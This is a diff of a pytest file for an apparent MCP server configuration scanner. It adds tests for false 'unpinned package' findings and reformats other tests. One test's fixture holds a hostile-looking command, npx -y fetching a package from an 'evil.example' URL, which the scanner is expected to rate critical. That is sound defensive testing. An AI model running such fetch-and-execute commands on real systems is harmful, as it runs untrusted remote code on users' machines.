@@ -57,9 +57,7 @@ def test_uv_pinned_versions_are_not_flagged(args: list[str]) -> None:
 
 
 def test_npx_from_a_url_is_critical() -> None:
-    _, findings = run(
-        [make_server("s", [], command="npx", args=["-y", "https://evil.example/payload.tgz"])]
-    )
+    _, findings = run([make_server("s", [], command="npx", args=["-y", "https://evil.example/payload.tgz"])])
     assert any(f.severity is Severity.CRITICAL for f in findings)
 
 
@@ -85,9 +83,7 @@ def test_plain_http_remote_is_flagged() -> None:
 
 
 def test_https_remote_is_accepted() -> None:
-    _, findings = run(
-        [make_server("s", [], url="https://mcp.example.com/mcp", env={"API_TOKEN": "x"})]
-    )
+    _, findings = run([make_server("s", [], url="https://mcp.example.com/mcp", env={"API_TOKEN": "x"})])
     assert not any("plain HTTP" in f.title for f in findings)
     assert not any("no credential" in f.title for f in findings)
 
@@ -121,3 +117,32 @@ def test_clean_fixture_is_quiet(clean_config: Path) -> None:
     servers = load_config(clean_config)
     _, findings = run(servers)
     assert [f.title for f in findings] == []
+
+
+@pytest.mark.parametrize(
+    "command,args",
+    [
+        # Shapes taken from three real servers on the first live scan. Every
+        # one of them is correctly pinned; two were reported as unpinned.
+        ("npx", ["-y", "@modelcontextprotocol/server-filesystem@2.2.0", "/srv/data"]),
+        ("npx", ["-y", "@modelcontextprotocol/server-memory@2.1.0"]),
+        ("uvx", ["mcp-server-git==2026.11.4", "--repository", "/srv/repo"]),
+        ("uvx", ["mcp-server-git==2026.11.4", "--repository", "C://repo"]),
+    ],
+)
+def test_a_path_argument_is_not_a_floating_package(command: str, args: list[str]) -> None:
+    _, findings = run([make_server("s", [], command=command, args=args)])
+    assert [f.title for f in findings if "Unpinned package" in f.title] == []
+
+
+def test_the_flagged_name_is_the_package_and_not_its_argument() -> None:
+    """The old assertion checked the package name while the finding named a path.
+
+    ``assert "mcp-server-git" not in titles`` passed against a report that said
+    "Unpinned package executed on every start: /srv/repo" - blind by
+    construction. This asserts what the report actually says.
+    """
+    _, findings = run([make_server("s", [], command="npx", args=["-y", "postmark-mcp", "/srv/data"])])
+    titles = " ".join(f.title for f in findings)
+    assert "postmark-mcp" in titles
+    assert "/srv/data" not in titles
